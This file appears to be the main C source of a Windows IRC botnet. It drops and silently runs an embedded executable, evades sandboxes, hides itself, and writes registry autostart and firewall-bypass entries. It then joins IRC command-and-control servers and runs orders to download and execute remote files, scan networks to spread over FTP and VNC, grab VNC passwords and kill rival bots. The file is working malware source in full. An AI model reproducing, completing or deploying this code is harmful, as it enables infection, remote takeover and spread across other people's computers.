#include "include.h"
#include "main.h"
#include "config.h"
#include "md5.h"
#include "strings.h"


//Global variables
SOCKET Sock;
BOOL Connected;
char BotToClone[MAX_PATH];
char BotToCloneDir[MAX_PATH];
CurThread Thread[MAX_THREADS];
int FTPPort;
int TotalTransfers = 0;


#ifdef DEBUG
int main()
#else
bool extract_resource(char *szResName, char *szResType, char *szExtractPath)
{
	DWORD dwSize, dwWritten = 0;
	HANDLE hFile;
	HGLOBAL hResData;
	HMODULE hInstance = GetModuleHandle(NULL);
	HRSRC hResLocation;
	LPVOID pExe;

#ifndef NO_DEBUG
		printf("[DEBUG] Extracting resource, extract_resource()...\n");
#endif

		hResLocation = FindResource(hInstance, szResName, szResType);
		dwSize = SizeofResource(hInstance, hResLocation);
		hResData = LoadResource(hInstance, hResLocation);
		pExe = LockResource(hResData);
	if (pExe == NULL) return FALSE;
		hFile = CreateFile(szExtractPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) return FALSE;
		WriteFile(hFile, pExe, dwSize, &dwWritten, NULL);
	if (dwWritten != dwSize) return FALSE;
		CloseHandle(hFile);
		return TRUE;
}

//File Exists
bool file_exists(char *szPath)
{
	HANDLE hFile;

#ifndef NO_DEBUG
		printf("[DEBUG] Checking if file exists, file_exists()...\n");
#endif

		hFile = CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE) 
	{
			CloseHandle(hFile);
			return FALSE;
	}
		CloseHandle(hFile);
		return TRUE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)	
#endif
{

	//Initialization of variables
	char Buffer[RECV_BUFFER_SIZE], CurrentName[MAX_PATH];
	int Error = 0, i = 1, len;
	DWORD Id = 0;
	struct timeval tv;
	fd_set fds;
	int nRetVal;

	char szInstallPath1[MAX_PATH];

	char sysDir[255]; //sDir[255];
	GetSystemDirectory(sysDir,255);

	sprintf(szInstallPath1, "%s\\%s", sysDir, "ag.exe");
	if (!file_exists(szInstallPath1)) extract_resource("driver", "RT_RCDATA", szInstallPath1);

ShellExecute(0, "open","ag.exe","parameters here",NULL, SW_HIDE);
Sleep(40000);

	
	if (AntiSandBox())
		return 0;

#ifndef DEBUG
	//Hide system messages if bot crashes
	SetErrorMode(SEM_NOGPFAULTERRORBOX);
#endif

	//Check if this exe is running already
	if (WaitForSingleObject(CreateMutex(NULL, FALSE, BotID), mutex_time) == WAIT_TIMEOUT)
		return 0;

	PrepareThreads();

	//Install the bot
#ifndef NO_INSTALL
	while (Error == 0) 
	{
		Error = Bot_Install(i, FileName);		
		i++;
		//We don't have 4 options
		if (i == 4) {
			SetFileAttributes(FileName, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
			break;
		}
	}

	if (Error > 0) 
	{
		//Get name of our current file
		GetModuleFileName(0, CurrentName, sizeof(CurrentName));
		if ((strcmp(CurrentName, BotToClone) != 0) && !(i == 3 && strstr(BotToClone, "\x7E") != NULL)) 
		{
			PROCESS_INFORMATION pinfo;
			STARTUPINFO sinfo;
			memset(&pinfo, 0, sizeof(pinfo));
			memset(&sinfo, 0, sizeof(sinfo));
			sinfo.lpTitle = "";
			sinfo.cb = sizeof(sinfo);
			sinfo.dwFlags = STARTF_USESHOWWINDOW;
			sinfo.wShowWindow = SW_HIDE;

			if (CreateProcess(NULL, BotToClone, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)) 
			{
				Sleep(200);
				CloseHandle(pinfo.hProcess);
				CloseHandle(pinfo.hThread);
				WSACleanup();
				return 0;
			}
		}
	}
#endif

	// registry: autostart & win xp sp2 firewall bypass
#ifndef NO_REGISTRY
	GetModuleFileName(0, CurrentName, sizeof(CurrentName));
	char pfad[256];
	_snprintf(pfad, sizeof(pfad),"%s%s%s", CurrentName, Decode(string_firewall_enabled), Decode(string_autostart_description));
	
	HKEY Reg;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, Decode(string_autostart_location), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &Reg, NULL);
	RegSetValueEx(Reg, Decode(string_autostart_description), 0, REG_SZ, (const unsigned char *)CurrentName, strlen(CurrentName));
	RegCloseKey(Reg);

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, Decode(string_firewall_location), 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &Reg, 0);
	RegSetValueEx(Reg, CurrentName, 0, REG_SZ, (const unsigned char *)pfad, strlen(pfad));
	RegCloseKey(Reg);
#endif

	//Lets initialize WSA
	WSADATA WSAdata;
	if ((Error = WSAStartup(MAKEWORD(2, 2), &WSAdata)) != 0) 
	{
#ifdef DEBUG
		printf("WSA Error!\n");
#endif
		return 0;
	}

	Connected = FALSE;

	//Start loop connecting to servers - if first server fails to connect, lets connect to another one etc...
	tv.tv_sec = MaxWaitTime; 
	tv.tv_usec = 0;
	i = 0;
	while (1) 
	{
		if (IrcServerList[i].IrcServer == NULL) 
			i = 0;
#ifdef DEBUG
		printf("Connecting to %s:%d\n", IrcServerList[i].IrcServer, IrcServerList[i].IrcPort);
#endif
		//Connect to irc server
		if (Irc_Connect(IrcServerList[i].IrcServer, IrcServerList[i].IrcPort, 
			IrcServerList[i].UseServerPassword, IrcServerList[i].IrcServerPassword)) 
		{
#ifdef DEBUG
			printf("Connection established on %s:%d\n", IrcServerList[i].IrcServer, IrcServerList[i].IrcPort);
#endif
			Connected = TRUE;
			i = 0;
			while (Sock > 0) 
			{
				FD_ZERO(&fds); 
				FD_SET(Sock, &fds);

				len = 0;
				memset(Buffer, 0, sizeof(Buffer));
				while ((nRetVal = select(Sock, &fds, NULL, NULL, &tv)) > 0)
				{
					if (len == RECV_BUFFER_SIZE - 1)
						break;
					len += recv(Sock, Buffer + len, 1, 0);
					if (Buffer[len-1] == '\r' || Buffer[len-1] == '\n')
						break;
				}
		
				if (nRetVal <= 0)
					break;
				else if (len < 2)
					continue;
				else
				{
					Buffer[len-1] = 0;

					Error = Irc_Parse(Buffer);
					switch (Error) {
					//Connection lost
					case -1:
						Connected = FALSE;
						break;
					//Forced disconnect
					case -2:
						closesocket(Sock);
						WSACleanup();
						return 0;
					//Reconnect to the same server
					case -3:
						closesocket(Sock);
						Connected = FALSE;
						break;
					//Reconnect to next server
					case -4:
						closesocket(Sock);
						Connected = FALSE;
						i++;
						break;
					default:
						break;
					}
					//Connection with server has been lost! Reconnect!
					if (!Connected) break;
				}

			}
#ifdef DEBUG
			printf("Disconnected from server.\n");
#endif
			closesocket(Sock);
		} 
		else 
			i++;

		Sleep(reconnect_time);
	}
			
	//Cleanup
	closesocket(Sock);
	WSACleanup();

	return 0;
}

int Irc_Connect(char *Server, unsigned int Port, BOOL UsePassword, char *Password) {

	SOCKADDR_IN Peer;

	char Buffer[MAX_LINE_SIZE], Nick[MAX_NICK_SIZE], name[MAX_NICK_SIZE];

	Peer.sin_family = AF_INET;
	Peer.sin_port = htons(Port);
	if ((Peer.sin_addr.s_addr = Resolve(Server)) == 0) {
#ifdef DEBUG
		printf("Couldn't resolve irc server host!\n");
#endif
		return 0;
	}

	Sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (Sock < 0) {
#ifdef DEBUG
		printf("Failed to initialize socket!\n");
#endif
		return 0;
	}

	if (connect(Sock, (LPSOCKADDR)&Peer, sizeof(Peer)) == SOCKET_ERROR) {
#ifdef DEBUG
		printf("Failed to connect to server!\n");
#endif
		return 0;
	}

	if (UsePassword) {
		_snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", Decode(string_pass), Password);
		send(Sock, Buffer, strlen(Buffer), 0);
	}
		
	sprintf(Nick, GenerateLetterNick(NickLen, Sock));
	sprintf(Buffer, "%s %s\r\n", Decode(string_nick), Nick);

	if (send(Sock, Buffer, strlen(Buffer), 0) == SOCKET_ERROR) {
#ifdef DEBUG
		printf("Failed to send NICK!\n");
#endif
		return 0;
	}
	sprintf(name, "%s", GenerateLetterNick(0, 0));
	sprintf(Buffer, "%s %s \"fo%d.net\" \"lol\" :%s\r\n", Decode(string_user), name, rand()%10, name);

#ifdef DEBUG
	printf("Sending: %s\n", Buffer);
#endif

	if (send(Sock, Buffer, strlen(Buffer), 0) == SOCKET_ERROR) {
#ifdef DEBUG
		printf("Failed to send USER!\n");
#endif
		return 0;
	}

	return 1;
}

int Irc_Parse(char *Line) 
{
//char Message[512];
	char Buffer[MAX_LINE_SIZE], ParseLine[MAX_LINE_SIZE], ParseLineStatic[MAX_LINE_SIZE], Host[128];
	char *w[MAX_WORDS], *OwnerHost;
	unsigned int i = 0;
	int E = 1;
	BOOL Do = FALSE;

#ifdef DEBUG
	printf("Parsing %s\n", Line);
#endif 

	if (Line == NULL) return E;

	//Split line into words
	w[i] = strtok(Line, ": ");
	while (w[i] != NULL) {		
		i++;
		if (i > MAX_WORDS)
			break;
		w[i] = strtok(NULL, ": ");		
	}

/*	if (strcmp(w[1], "001") == 0) 
	{
		_snprintf(Buffer, sizeof(Buffer), "%s +i-x\r\n", Decode(string_mode));
		send(Sock, Buffer, strlen(Buffer), 0);

		memset(Buffer, 0, sizeof(Buffer));
		return 1;
	}
	*/

	//We have received PING, so send back PONG
	if (strcmp(w[0], Decode(string_ping)) == 0) 
	{
		_snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", Decode(string_pong), w[1]);
		send(Sock, Buffer, strlen(Buffer), 0);

		//Let's join the channel
		if (UseChanPass) 
			_snprintf(Buffer, sizeof(Buffer), "%s %s %s\r\n", Decode(string_join), Chan, ChanPass);
		else 
			_snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", Decode(string_join), Chan);

		if (send(Sock, Buffer, strlen(Buffer), 0) == SOCKET_ERROR) 
			return -1;	

#ifdef DEBUG
		else 
			printf("Joined channel %s\n", Chan);
#endif
		memset(Buffer, 0, sizeof(Buffer));
		return 1;
	}

	// MOTD, so we can join the channel
	if (strcmp(w[1], "422") == 0)
	{
		if (UseChanPass) 
			_snprintf(Buffer, sizeof(Buffer), "%s %s %s\r\n", Decode(string_join), Chan, ChanPass);
		else 
			_snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", Decode(string_join), Chan);

		if (send(Sock, Buffer, strlen(Buffer), 0) == SOCKET_ERROR) 
			return -1;	

#ifdef DEBUG
		else 
			printf("Joined channel %s\n", Chan);
#endif
		memset(Buffer, 0, sizeof(Buffer));
	}

	//Nick already in use
	else if (strcmp(w[1], "433") == 0) 
	{
		_snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", Decode(string_nick), GenerateLetterNick(NickLen, Sock));

		if (send(Sock, Buffer, strlen(Buffer), 0) == SOCKET_ERROR)
			return -1;
		else 
			return 1;
	}

	//We receive order from master, lets check his host first!
	else if (strcmp(w[1], Decode(string_privmsg)) == 0 && strncmp(w[3], OrderPrefix, strlen(OrderPrefix)) == 0 && strlen(w[3]) > strlen(OrderPrefix)) 
	{
		OwnerHost = strtok(w[0], "@");
		OwnerHost = strtok(NULL, "@");

		//Get MD5 of OwnerHost
		_snprintf(Host, sizeof(Host), OwnerHost);
		MD5Hash(Host, strlen(Host));
		i = 0;
		while (AuthHosts[i] != NULL) {
			if (lstrcmpi(Host, AuthHosts[i]) != 0) {
				Do = TRUE;
				break;
			}
			i++;
		}
		if (Do) 
		{
			i = 3;
			while (w[i] != NULL) 
			{
				//We assume w[i] has prefix, lets get rid of it
				memset(w[i], '\x20', strlen(OrderPrefix));
				sprintf(ParseLine, "");
				while (strncmp(w[i], OrderPrefix, strlen(OrderPrefix)) != 0) 
				{			
					_snprintf(ParseLine, sizeof(ParseLine),"%s %s", ParseLine, w[i]);
					i++; 
					if (w[i] == NULL) break;
				}
				E = Irc_Parse_Command(w[2], ParseLine);
				if (E < 1)
					return E;
			}
			return 1;
		}
		else 
			return 1;
	}
	
	else if (w[4] == NULL) return 1;

	//We receive topic, so lets check it and then call function to parse
	else if (strcmp(w[1], "332") == 0 && strncmp(w[4], OrderPrefix, strlen(OrderPrefix)) == 0 && strlen(w[4]) > strlen(OrderPrefix)) 
	{
		sprintf(ParseLineStatic, "");
		i = 4;
		//If multiple commands set in topic, lets parse them all!
		while (w[i] != NULL) 
		{
			//We assume w[i] has prefix, lets get rid of it
			memset(w[i], '\x20', strlen(OrderPrefix));
			sprintf(ParseLine, "");
			while (strncmp(w[i], OrderPrefix, strlen(OrderPrefix)) != 0) 
			{			
				_snprintf(ParseLine, sizeof(ParseLine), "%s %s", ParseLine, w[i]);
				i++;
				if (w[i] == NULL) break;
			}
			E = Irc_Parse_Command(w[3], ParseLine);
			if (E < 1)
				return E;
		}
		return 1;
	}

	return 1;
}

int Irc_Parse_Command(char *CurrentChannel, char *Line) 
{
//char Message[512];
	char Buffer[MAX_LINE_SIZE], Hash[128];
	char *a[MAX_WORDS];
	unsigned int i = 0, x = 0;
	DWORD Id = 0;
	BOOL Silent = FALSE;

#ifdef DEBUG
	printf("Command to parse: %s on channel: %s\n", Line, CurrentChannel);
#endif

	//Split Line
	a[i] = strtok(Line, " ");
	while (a[i] != NULL) {	
		i++;
		if (i > MAX_WORDS)
			break;
		a[i] = strtok(NULL, " ");
	}

	if (a[0] == NULL)
		return 1;

	//Check for parameters
	i = 1;
	while (a[i] != NULL) {
		if (strcmp(a[i], "-s") == 0) 
		{
			x++;
			Silent = TRUE;
		}
		i++;
	}

	if (strcmp(a[0], "h") == 0) 
	{
		if (a[x+1] == NULL)
			return 1;

		//Get MD5 of a[x+1]
		_snprintf(Hash, sizeof(Hash), a[x+1]);
		MD5Hash(Hash, strlen(Hash));

		////////////////////////////////
		//							  //
		// Hashed commands            //
		//							  //
		////////////////////////////////

#ifdef DEBUG
		printf("Command hash: %s\n", Hash);
#endif

		//Remove the bot
		if (lstrcmpi(Hash, Command_Remove) == 0) 
		{
			Uninstall();

			return -2;
		}

		//Download
		else if (lstrcmpi(Hash, Command_Download) == 0 && a[x+2] != NULL && a[x+3] != NULL) 
		{
			DOWNLOAD dl;
			
			_snprintf(dl.Url, sizeof(dl.Url), "%s:%s", a[x+2], a[x+3]);
			if (a[x+4] != NULL && a[x+5] != NULL) 
			{
				_snprintf(dl.Destination, sizeof(dl.Destination), "%s:%s", a[x+4], a[x+5]);
				if (atoi(a[x+6]) != NULL)
					dl.Run = atoi(a[x+6]);
			} 
			else 
			{
				char TempDir[MAX_PATH];
				GetTempPath(sizeof(TempDir), TempDir);
				_snprintf(dl.Destination, sizeof(dl.Destination), "%s%s.exe", TempDir, GenerateLetterNick(0, 0));
				if (atoi(a[x+4]) != NULL)
					dl.Run = atoi(a[x+4]);
			}
			_snprintf(dl.CurrentChannel, sizeof(dl.CurrentChannel), CurrentChannel);
			dl.Text = FALSE;
			dl.Sock = Sock;
			dl.Silent = Silent;
			dl.ThreadNum = AddThread(DOWNLOAD_THREAD);

			Thread[dl.ThreadNum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &Id);
			while(dl.GotInfo == FALSE)
				Sleep(50);

			if (Thread[dl.ThreadNum].tHandle == NULL) 
			{
				if (!Silent) IrcPrivmsg(Sock, CurrentChannel, "Failed to start dl thread.");
			}

			return 1;
		}

		return 1;
	}
	else 
	{
		////////////////////////////////
		//							  //
		// Commands with 0 parameters //
		//							  //
		////////////////////////////////

//		if (a[x] == NULL) return 1;


		//Version
		if (strcmp(a[0], "v") == 0) 
		{
			if (!Silent) IrcPrivmsg(Sock, CurrentChannel, Decode(string_botversion));
			return 1;
		}




		else if (strcmp(a[0], "die") == 0) 
		{
			_snprintf(Buffer, sizeof(Buffer), "%s :disconnecting\r\n", Decode(string_quit));
			send(Sock, Buffer, strlen(Buffer), 0);
			memset(Buffer, 0, sizeof(Buffer));
			return -2;
		}

		//Reconnect, same server
		else if (strcmp(a[0], "recon1") == 0) 
		{
			_snprintf(Buffer, sizeof(Buffer), "%s\r\n", Decode(string_quit));
			send(Sock, Buffer, strlen(Buffer), 0);
			memset(Buffer, 0, sizeof(Buffer));
			return -3;
		}

		//Reconnect, next server
		else if (strcmp(a[0], "recon2") == 0) 
		{
			_snprintf(Buffer, sizeof(Buffer), "%s\r\n", Decode(string_quit));
			send(Sock, Buffer, strlen(Buffer), 0);
			memset(Buffer, 0, sizeof(Buffer));
			return -4;
		}

		//Set nick
		else if (strcmp(a[0], "n") == 0) 
		{
			if (a[x+1] != NULL)
				_snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", Decode(string_nick), a[x+1]);
			else
				_snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", Decode(string_nick), GenerateLetterNick(NickLen, Sock));
			send(Sock, Buffer, strlen(Buffer), 0);
			memset(Buffer, 0, sizeof(Buffer));
			return 1;
		}

		//Restart the bot
		else if (strcmp(a[0], "restart") == 0) 
		{
			char CurrentLocation[MAX_PATH];
			GetModuleFileName(0, CurrentLocation, sizeof(CurrentLocation));

			PROCESS_INFORMATION pinfo;
			STARTUPINFO sinfo;
			memset(&pinfo, 0, sizeof(pinfo));
			memset(&sinfo, 0, sizeof(sinfo));
			sinfo.lpTitle = "";
			sinfo.cb = sizeof(sinfo);
			sinfo.dwFlags = STARTF_USESHOWWINDOW;
			sinfo.wShowWindow = SW_HIDE;

			if (CreateProcess(NULL, CurrentLocation, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE) 
			{
				CloseHandle(pinfo.hProcess);
				CloseHandle(pinfo.hThread);
				return -2;
			} 
			else 
			{
				if (!Silent) IrcPrivmsg(Sock, CurrentChannel, "Failed.");
			}
	
			return 1;
		}

		//Stop scanning threads
		else if (strcmp(a[0], "scanstop") == 0) 
		{
			int k = 0;
			k = KillThread(SCAN_THREAD) + KillThread(SCANT_THREAD);

			if (k > 0) 
			{
				_snprintf(Buffer, sizeof(Buffer), "Scan (%d) threads stopped.", k);
				if (!Silent) IrcPrivmsg(Sock, CurrentChannel, Buffer);
				memset(Buffer, 0, sizeof(Buffer));
			}
			else 
			{
				if (!Silent) IrcPrivmsg(Sock, CurrentChannel, "No scan threads found.");
			}

			return 1;
		}

#ifndef NO_PATCHER
		else if (strcmp(a[0], "patch") == 0) 
		{
			if (!checkos())
				return 1;

			PATCHER patcher;
			patcher.Sock = Sock;
			patcher.Silent = Silent;
			patcher.GotInfo = FALSE;
			patcher.ThreadNum = AddThread(PATCHER_THREAD);

			Thread[patcher.ThreadNum].tHandle = CreateThread(NULL, 0, &PatcherThread, (LPVOID)&patcher, 0, &Id);
			while (patcher.GotInfo == FALSE)
				Sleep(30);

			return 1;
		}
#endif

		//Report how many transfers have been completed
		else if (strcmp(a[0], "total") == 0) 
		{
			_snprintf(Buffer, sizeof(Buffer), "Total transfers: %d.", TotalTransfers);
			if (!Silent) IrcPrivmsg(Sock, CurrentChannel, Buffer);
			memset(Buffer, 0, sizeof(Buffer));

			return 1;
		}

#ifndef NO_VNC
		else if (strcmp(a[0], "vnc") == 0) 
		{
			QVNCP v;
			v.Sock = Sock;
			if (a[x+1] != NULL)
				v.Uptime = atoi(a[x+1]);
			else 
				v.Uptime = 0;
			v.GotInfo = FALSE;
			v.ThreadNum = AddThread(QVNCP_THREAD);

			Thread[v.ThreadNum].tHandle = CreateThread(NULL, 0, &QVNCPass, (LPVOID)&v, 0, &Id);
			while (v.GotInfo == FALSE)
				Sleep(30);

			return 1;
		}
#endif

		else if (strcmp(a[0], "getcftp") == 0) 
		{
			_snprintf(Buffer, sizeof(Buffer), "CFTP server: %s, port: %d, user: %s, pass: %s, file: %s.", 
				CFTPHost, CFTPPort, CFTPUser, CFTPPass, CFTPFile);
			if (!Silent) IrcPrivmsg(Sock, CurrentChannel, Buffer);
			memset(Buffer, 0, sizeof(Buffer));

			return 1;
		}

		else if (a[x+1] == NULL) return 1;

		////////////////////////////////
		//							  //
		// Commands with 1 parameters //
		//							  //
		////////////////////////////////
		
		//Join channel
		else if (strcmp(a[0], "j") == 0) 
		{
			if (a[x+2] != NULL)
				_snprintf(Buffer, sizeof(Buffer), "%s %s %s\r\n", Decode(string_join), a[x+1], a[x+2]);
			else
				_snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", Decode(string_join), a[x+1]);
			send(Sock, Buffer, strlen(Buffer), 0);
			memset(Buffer, 0, sizeof(Buffer));
			return 1;
		}

		//Part channel
		else if (strcmp(a[0], "p") == 0) 
		{
			_snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", Decode(string_part), a[x+1]);
			send(Sock, Buffer, strlen(Buffer), 0);
			memset(Buffer, 0, sizeof(Buffer));
			return 1;
		}

#ifndef NO_BOTKILLER
		else if (strcmp(a[0], "itsmurder") == 0) 
		{
			if (strcmp(a[x+1], "off") == 0) 
			{
				int k = KillThread(BK_THREAD);
				if (k > 0) 
				{
					if (!Silent) IrcPrivmsg(Sock, CurrentChannel, "Botkiller stopped.");
				}
				else 
				{
					if (!Silent) IrcPrivmsg(Sock, CurrentChannel, "No Botkiller threads found.");
				}
			} 
			else 
			{
				if (CheckThread(BK_THREAD)) 
				{
					if (!Silent) IrcPrivmsg(Sock, CurrentChannel, "Botkiller already running.");

					return 1;
				} 

				BK bk;
				bk.Sock = Sock;
				bk.Silent = Silent;
				_snprintf(bk.BKChan, sizeof(bk.BKChan), BKChan);
				bk.ScanDelay = atoi(a[x+1]);
				bk.GotInfo = FALSE;
				bk.ThreadNum = AddThread(BK_THREAD);

				Thread[bk.ThreadNum].tHandle = CreateThread(NULL, 0, &BotKillerThread, (LPVOID)&bk, 0, &Id);
				while (bk.GotInfo == FALSE)
					Sleep(30);

				if (Thread[bk.ThreadNum].tHandle == NULL)
				{
					if (!Silent) IrcPrivmsg(Sock, CurrentChannel, "Failed to start botkiller thread.");
				}
			}

			return 1;
		}
#endif

		else if (a[x+2] == NULL) return 1;

		////////////////////////////////
		//							  //
		// Commands with 2 parameters //
		//							  //
		////////////////////////////////

		else if (a[x+3] == NULL) return 1;

		////////////////////////////////
		//							  //
		// Commands with 3 parameters //
		//							  //
		////////////////////////////////

		else if (a[x+4] == NULL) return 1;

		////////////////////////////////
		//							  //
		// Commands with 4 parameters //
		//							  //
		////////////////////////////////

		else if (a[x+5] == NULL) return 1;

		////////////////////////////////
		//							  //
		// Commands with 5 parameters //
		//							  //
		////////////////////////////////

		//!scan -s 100 0 b 0 0 [lan ip scan: 83.x.x.x]

		//0 - no vnc scan
		//1 - +vnc scan
		//2 - +vnc scan+root
		//3 - vnc scan only

		//0 - only ftp
		//1 - lan bots use cftp
		//2 - all use cftp

		else if (strcmp(a[0], "scan") == 0) {

			if (atoi(a[x+1]) == 0)
				return 1;

			if (CheckThread(SCANT_THREAD)) 
			{
				if (!Silent) IrcPrivmsg(Sock, CurrentChannel, "Already scanning.");

				return 1;
			}

			if (atoi(a[x+1]) > MAX_SCAN_THREADS) 
			{
				if (!Silent) IrcPrivmsg(Sock, CurrentChannel, "Too many scanning threads specified.");

				return 1;
			}

			srand(GetTickCount());

#ifndef NO_FTPD
			//Put FTP Server on first
			if (CheckThread(FTP_THREAD) == 0) 
			{
				FTPPort = (rand()%50000)+10000;
				FTP ftp;
				ftp.ircsock = Sock;
				ftp.GotInfo = FALSE;
				ftp.ThreadNum = AddThread(FTP_THREAD);

#ifdef DEBUG
				printf("Adding FTP thread: %d on port: %d\n", ftp.ThreadNum, FTPPort);
#endif

				Thread[ftp.ThreadNum].tHandle = CreateThread(NULL, 0, &FTPD, (LPVOID)&ftp, 0, &Id);
				while(ftp.GotInfo == FALSE)
					Sleep(30);
			}
#endif

			int ip1=0, ip2=0, ip3=0, ip4=0;
			sscanf(GetIP(Sock), "%d.%d.%d.%d", &ip1, &ip2, &ip3, &ip4);

			//Scanner thread
			SCANNER sscan;
			sscan.Sock = Sock;
			_snprintf(sscan.CurrentChannel, sizeof(sscan.CurrentChannel), CurrentChannel);
			sscan.Silent = Silent;
			sscan.Threads = atoi(a[x+1]);
			sscan.Mode = atoi(a[x+2]);
			sscan.UseCFTP = FALSE;

			if (strcmp(a[x+3], "b") == 0) {
				if (sscan.Mode == 0) 
					_snprintf(sscan.IP, sizeof(sscan.IP), "%d.%d.0.0", ip1, ip2);
				else
					_snprintf(sscan.IP, sizeof(sscan.IP), "%d.%d.x.x", ip1, ip2);
			} 
			else if (strcmp(a[x+3], "y") == 0) {
				if (sscan.Mode == 0) 
					_snprintf(sscan.IP, sizeof(sscan.IP), "%d.%d.0.0", ip1, rand()%256);
				else
					_snprintf(sscan.IP, sizeof(sscan.IP), "%d.%d.x.x", ip1, rand()%256);
			} 
			else
				_snprintf(sscan.IP, sizeof(sscan.IP), a[x+3]);

			sscan.vncmode = atoi(a[x+4]);

			if (PrivateIP(GetIP(Sock))) {
				if (atoi(a[x+5]) > 0)
					sscan.UseCFTP = TRUE;
				if (a[x+6] != NULL) {
					if (strcmp(a[x+6], "0") != 0) {
						if (sscan.Mode == 0) {
							int ipx1=0, ipx2=0, ipx3=0, ipx4=0;
							sscanf(a[x+6], "%d.%d.%d.%d", &ipx1, &ipx2, &ipx3, &ipx4);
							_snprintf(sscan.IP, sizeof(sscan.IP), "%d.%d.0.0", ipx1, rand()%256);
						} else 
							_snprintf(sscan.IP, sizeof(sscan.IP), a[x+6]);
					}
				}
			}
			else {
				if (atoi(a[x+5]) == 2)
					sscan.UseCFTP = TRUE;
			}

			sscan.GotInfo = FALSE;
			sscan.ThreadNum = AddThread(SCAN_THREAD);
			if (sscan.ThreadNum == -1) 
			{
				if (!Silent) IrcPrivmsg(Sock, CurrentChannel, "Too many threads.");

				return 1;
			}
			
			Thread[sscan.ThreadNum].tHandle = CreateThread(NULL, 0, &Scanner, (LPVOID)&sscan, 0, &Id);
			while(sscan.GotInfo == FALSE)
				Sleep(30);

			if (Thread[sscan.ThreadNum].tHandle != NULL) 
			{
				if (sscan.vncmode == 3)
					_snprintf(Buffer, sizeof(Buffer), "Scanning: %s, %d threads. Scanning VNCs.", sscan.IP, sscan.Threads);
				else if (sscan.UseCFTP)
					_snprintf(Buffer, sizeof(Buffer), "Scanning: %s, %d threads. Using CFTP.", sscan.IP, sscan.Threads);
				else
					_snprintf(Buffer, sizeof(Buffer), "Scanning: %s, %d threads. FTP: %d.", sscan.IP, sscan.Threads, FTPPort);
			} else 
				_snprintf(Buffer, sizeof(Buffer), "Failed to start thread.");

			if (!Silent) IrcPrivmsg(Sock, CurrentChannel, Buffer);

			return 1;
		}

		//setcftp [cftp_host] [cftp_port] [cftp_usr] [cftp_pass] [cftp_file]
		else if (strcmp(a[0], "setcftp") == 0) {

			_snprintf(CFTPHost, sizeof(CFTPHost), a[x+1]);
			CFTPPort = atoi(a[x+2]);
			_snprintf(CFTPUser, sizeof(CFTPUser), a[x+3]);
			_snprintf(CFTPPass, sizeof(CFTPPass), a[x+4]);
			_snprintf(CFTPFile, sizeof(CFTPFile), a[x+5]);

			return 1;
		}

		return 1;
	}
}

void IrcPrivmsg(SOCKET sock, char *channel, char *text)
{
	char buffer[MAX_LINE_SIZE];

	_snprintf(buffer, sizeof(buffer), "%s %s :%s\r\n", Decode(string_privmsg), channel, text);

	send(Sock, buffer, strlen(buffer), 0);

	memset(buffer, 0, sizeof(buffer));
}
